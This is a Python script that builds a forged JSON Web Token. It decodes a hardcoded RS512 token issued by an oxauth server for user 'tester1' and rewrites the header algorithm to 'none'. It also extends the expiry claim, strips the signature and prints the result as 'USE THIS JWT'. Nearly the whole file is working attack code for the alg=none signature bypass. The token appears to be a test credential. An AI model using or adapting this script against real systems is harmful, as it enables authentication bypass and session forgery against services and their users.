import base64
import json

#insert JWT_TOKEN here
JWT_TOKEN = "eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6IjUxNGJjOGU0LTFlYzItNGMwNS1hMTJkLWNhOTViZmNlZjFjNF9zaWdfcnM1MTIifQ.eyJpc3MiOiJodHRwczovL2NocmlzLmdsdXVsb2NhbC5vcmcvb3hhdXRoL3Bvc3Rsb2dpbi5odG0iLCJzdWIiOiJ0ZXN0ZXIxIiwiYXVkIjoiMTUwMi5hODNkODdjOC0yYTU2LTQ2MWItOGEwMS01ZGY2YTE2ZDhlYTgiLCJqdGkiOiJlNTllZmJiMy04MWM5LTQ1NjktYmZiYi1lM2Y1NzhiZWQzZWUiLCJleHAiOjE1ODk0MTIzMjYuNDIsImlhdCI6MTU4OTQxMjI5NjQyMCwiZGF0YSI6InVaRll4UXA1S200TDVSczgzR3dhUnU4WDJWdXJmRkkxVGJXMlZCNk9uSE8zOFdFZGxybGtrd2VLaWh1MTk5cyt6RDhHdFYrTXFjbkJCZEVnTTZjK1lCZHJ6ZlBINFhYQUdwOWtCK0NlcVVUUFBweXBKREIyRnZUb2NacEp5ck9BQTVDVWZpbi9rdmxORUtIbG5QZTJ6SUtBa2Y4RVpaVkhYZFFoRjFGYlFoM2xHaVNoVndaeVN2Q3RRM3ljbENuZ29rYlJtVEVuUXl3K2pVZUZHc2ozK3c9PSJ9.wGR6-xOR4SwDdtBSWMCzpn6999bBrguVl3_acs1ocnGeh3hqYJVNhB3uv4TRf4fQs_1kIOGte1Syh42ORHXa17OIf_z7_OSV7oJM9zgk5vP9o-60G2a10HzCtJ10UQuOl_h_AiJGqOIme-QtJrM2cME3NiL9Dr3GA-vkEnhD5scPq8oKyKNiUQKUBMc_86AhXMpASHs58wPeY1gmgPM63K9IMFusK0Eh2TRNn3cY0A1FBCrPXNDQhyD5rzMIlMmqFFo4CfuAhYx6jDQuuYBGaqBvimr7pLapzfZ6Fdnqikfusacb14f6SoHsCSXfxBFUR0b_tqkdY0BCdA7yj8J0JQ"
print("HI")




class Jwt:
    encoded_header = ""
    encoded_payload = ""
    encoded_signature = ""
    decoded_header = ""
    decoded_payload = ""
    decoded_signature = ""
    print("JWT Token:")
    print(JWT_TOKEN)

    def __init__(self):
        # setting encoded vars
        self.slice_jwt()
        self.decode_jwt()
        print("Decoded new JWT:")
        print(self.decoded_header)
        print(self.decoded_payload)

    def merge_jwt(self):
        merged_jwt = self.encoded_header + "." + self.encoded_payload + "." + self.encoded_signature
        return merged_jwt

    def slice_jwt(self):
        # find last point
        end_index: int = JWT_TOKEN.rfind(".")

        # find first point
        first_point: int = JWT_TOKEN.find(".")

        self.encoded_header = JWT_TOKEN[:first_point]
        self.encoded_payload = JWT_TOKEN[(first_point+1):end_index]

        # Signature cannot be base64 decoded
        #self.encoded_signature = JWT_TOKEN[(end_index+1):]

    def encode64(self,decoded):
        print("encoding %s" % decoded)
        decoded_bytes = decoded.encode('ascii')
        decoded_b64_bytes = base64.b64encode(decoded_bytes)
        encoded = decoded_b64_bytes.decode('ascii')
        print("encoded:")
        print(encoded)
        return encoded

    def decode64(self, encoded):
        encoded += "=="
        print("decoding %s" % encoded)
        encoded_bytes = base64.b64decode(encoded)
        decoded = encoded_bytes.decode()
        print("decoded: ")
        print(decoded)
        return decoded

    def decode_jwt(self):
        print("decoding whole JWT...")
        self.decoded_header = self.decode64(self.encoded_header)
        self.decoded_payload = self.decode64(self.encoded_payload)
        self.decoded_signature = self.decode64(self.encoded_signature)

    def get_key_value(self, section, key):
        json_section = json.loads(section)
        print("Getting value for key %s" % key)
        value = json_section[key]
        print("Found get_key_value: %s" % value)
        return value

    def update_jwt_section(self, section, key, value):
        json_section = json.loads(section)
        print("Updating old key %s = %s with new value %s" % (key, json_section[key], value))
        json_section[key] = value
        updated_section = json.dumps(json_section)
        print("New section:")
        print(updated_section)
        return updated_section



#def change_none_remove_signature():
jwt = Jwt()
print(jwt.decoded_header)

new_header = jwt.update_jwt_section(jwt.decoded_header, 'alg', "none")
jwt.encoded_header = jwt.encode64(new_header)




print("encoded_header")
print(jwt.encoded_header)
print("encoded_payload")
print(jwt.encoded_payload)


print("lets merge")
# print(jwt.encoded_header + "." + jwt.encoded_payload + ".")

#def change_exp_key():
# increments +1 second digit if not "."
exp = jwt.get_key_value(jwt.decoded_payload,'exp')



print("old exp = %s" % exp)
'''
exp = str(exp)
if exp[1] != ".":
    exp[1] = str(int(exp[1])+1)
else:
    exp[2] = str(int(exp[1])+1)

'''
exp += 100000000
print("new exp = %s" % exp)

new_payload = jwt.update_jwt_section(jwt.decoded_payload,'exp',exp)
jwt.encoded_payload = jwt.encode64(new_payload)

cracked_jwt = (jwt.encoded_header + "." + jwt.encoded_payload[:-2] + ".") #remove encoded_payload "=="
print("USE THIS JWT:")
print(cracked_jwt)











